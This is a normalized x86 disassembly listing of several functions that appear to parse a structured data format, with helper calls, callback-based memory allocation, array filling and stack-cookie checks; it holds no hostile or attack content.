movzx eax [ ebp - 0x15 ]
and eax 0x80
je r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x30 ] xmm0
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403000
add esp 0x8
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov edx [ ebp - 0x38 ]
add edx 0x4
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403110
add esp 0x8
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0xa0 ]
jmp r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x40 ]
add ecx [ eax ]
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4c ]
add eax [ edx + 0x4 ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea ecx [ ebp - 0x15 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402ef0
add esp 0x8
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp - 0x38 ]
add ecx 0x10
push ecx
call sub_401070
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx ] 0x20
ja r-xdata
mov eax [ ebp - 0x5c ]
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
movzx eax [ ebp - 0x15 ]
and eax 0xf
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4031b0
add esp 0xc
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x84 ]
jmp r-xdata
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402f30
add esp 0xc
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x38 ]
cmp [ edx + 0x4 ] 0x20
jbe r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x48 ]
jae r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x40 ]
jae r-xdata
movzx ecx [ ebp - 0x15 ]
and ecx 0x10
je r-xdata
mov eax [ ebp - 0x6c ]
jmp r-xdata
mov eax [ ebp - 0x64 ]
jmp r-xdata
jmp r-xdata
xor eax eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp - 0x34 ]
lea edx [ eax + ecx * 4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403110
add esp 0x8
mov [ ebp - 0x80 ] eax
cmp [ ebp - 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x40 ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_402810
add esp 0x8
test eax eax
jge r-xdata
movzx eax [ ebp - 0x15 ]
and eax 0x20
je r-xdata
lea edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403110
add esp 0x8
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x0
je r-xdata
movzx edx [ ebp - 0x15 ]
and edx 0x20
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x80 ]
jmp r-xdata
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov edx [ ebp - 0x34 ]
mov [ ecx + eax ] edx
jmp r-xdata
mov eax 0x4
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x24 ] xmm0
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403000
add esp 0x8
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403110
add esp 0x8
mov [ ebp - 0x74 ] eax
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x94 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4031b0
add esp 0xc
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
mov eax [ ebp - 0x8c ]
jmp r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
sub_403e70
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x0
push 0xb
mov eax [ ebp + 0x8 ]
push eax
call sub_4032b0
add esp 0xc
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403110
add esp 0x8
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_403810
add esp 0x4
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
imul ecx ecx 0x28
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx ]
jae r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
add ecx [ edx ]
push ecx
call sub_4026a0
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx ]
jae r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
push 0x0
push 0xc
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4032b0
add esp 0xc
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
add ecx [ edx ]
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_403870
add esp 0xc
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x38 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax ]
jae r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403190
add esp 0x8
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
imul edx edx 0x28
mov eax [ ebp + 0x10 ]
add edx [ eax ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x20 ]
push ecx
call sub_4027c0
add esp 0x4
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
or eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
shl eax 0x3
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
call eax
add esp 0x8
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x48 ]
mov [ ecx + 0xc ] edx
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx + 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_403200
add esp 0x4
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x24 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x18 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4034e0
add esp 0x14
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x1c ]
lea edx [ eax + ecx * 8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403000
add esp 0x8
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x18 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x44 ] ecx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x44 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx ]
jae r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
add ecx [ edx ]
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
movzx ecx [ eax ]
mov edx [ ebp - 0x34 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov ecx [ edx + ecx * 4 ]
mov [ eax + 0x20 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
sub_4041c0
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xorpd xmm0 xmm0
movlpd [ ebp - 0xc ] xmm0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] edx
mov edx [ ebp - 0x24 ]
imul edx edx 0x28
mov eax [ ebp + 0x10 ]
mov [ eax + edx + 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0xd
jne r-xdata
mov eax [ ebp - 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0xc ] 0xa
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x9
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_403200
add esp 0x4
mov [ ebp - 0x48 ] eax
cmp [ ebp - 0x48 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403110
add esp 0x8
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x6c ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
shl edx 0x3
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov edx [ ebp + 0x18 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x0
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x0
mov eax [ ebp + 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x10 ]
mov [ edx + ecx + 0x24 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x6c ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x1c ]
mov [ edx ] eax
mov eax [ ebp + 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
shl edx 0x2
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x20 ]
mov [ ecx ] eax
mov edx [ ebp + 0x20 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov eax 0x2
jmp r-xdata
cmp [ ebp - 0xc ] 0x9
jne r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x44 ] xmm0
mov edx [ ebp - 0x24 ]
imul edx edx 0x28
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx + 0x24 ]
mov [ ebp - 0x74 ] ecx
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x9
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x24 ]
cmp ecx [ eax ]
jae r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
add ecx [ ebp + 0x10 ]
push ecx
call sub_4028a0
add esp 0x4
sub eax [ ebp - 0x44 ]
sbb edx [ ebp - 0x40 ]
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx ]
mov esi [ ebp - 0x28 ]
mov [ ecx + esi * 8 ] eax
mov [ ecx + esi * 8 + 0x4 ] edx
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] 0x0
mov edx [ ebp + 0x20 ]
mov eax [ edx ]
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx * 4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov [ ebp - 0x3c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x74 ]
jae r-xdata
mov [ ebp - 0x28 ] 0x0
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx + 0x24 ]
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x1
jne r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403000
add esp 0x8
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x58 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x10 ]
cmp [ edx + ecx + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov [ ecx + edx * 8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ecx + edx * 8 + 0x4 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x44 ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x40 ]
adc eax [ ebp - 0x14 ]
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_403200
add esp 0x4
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp + 0x24 ]
push ecx
lea edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4034e0
add esp 0x14
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x3c ]
add edx 0x1
mov [ ebp - 0x3c ] edx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x5c ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
cmp [ ebp - 0xc ] 0xa
jne r-xdata
mov edx [ ebp - 0x24 ]
imul edx edx 0x28
add edx [ ebp + 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x68 ] ecx
cmp [ ebp - 0x68 ] 0x1
jne r-xdata
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x38 ]
cmp [ edx + 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x30 ]
cmp ecx [ ebp - 0x68 ]
jae r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov [ ecx + edx ] 0x1
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x38 ]
mov eax [ eax + 0x20 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov cl [ ecx ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x20 ]
mov eax [ edx ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x2c ]
mov esi [ ebp - 0x1c ]
mov edx [ esi + edx * 4 ]
mov [ eax + ecx * 4 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
sub_404700
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x1c ] 0x8
ja r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x1c ]
jmp [ edx * 4 + jump_table_404840 ]
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x10 ]
add ecx 0x8
push ecx
mov edx [ ebp + 0x10 ]
add edx 0x4
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
add ecx 0x14
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4035b0
add esp 0x1c
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ecx [ ebp + 0x28 ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp + 0x10 ]
add eax 0xc
push eax
mov ecx [ ebp + 0x10 ]
add ecx 0x18
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403e70
add esp 0x14
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + 0x18 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4041c0
add esp 0x20
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
sub_404870
push ebp
mov ebp esp
sub esp 0xc
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x40 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov edx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx + edx * 4 + 0x4 ]
sub ecx [ eax + esi * 4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + ecx * 4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
lea edx [ ecx + edx * 2 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
mov esi [ ebp - 0xc ]
mov cx [ esi + ecx * 2 ]
mov [ eax + edx * 2 ] cx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_4048f0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 ] ecx
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + eax * 2 ]
test edx edx
jne r-xdata
mov eax 0x10
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
